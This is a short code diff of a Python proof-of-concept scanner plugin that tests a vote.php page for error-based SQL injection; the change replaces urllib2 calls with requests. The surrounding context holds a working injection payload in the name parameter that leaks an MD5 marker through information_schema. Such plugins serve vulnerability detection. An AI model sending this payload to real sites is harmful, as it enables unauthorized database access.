@@ -37,10 +37,9 @@ class Poc(ABPoc):
             payload = ("/vote.php?act=dovote&name[1 and (select 1 from(select count(*),concat(0x7c,md5(666),"
                    "0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)%23][111]=aa") 
             verify_url = '{target}'.format(target=self.target)+payload
-            req = urllib2.Request(verify_url)
-            content = urllib2.urlopen(req).read()
+            req = requests.get(verify_url)
             
-            if 'fae0b27c451c728867a567e8c1bb4e53' in content:
+            if 'fae0b27c451c728867a567e8c1bb4e53' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
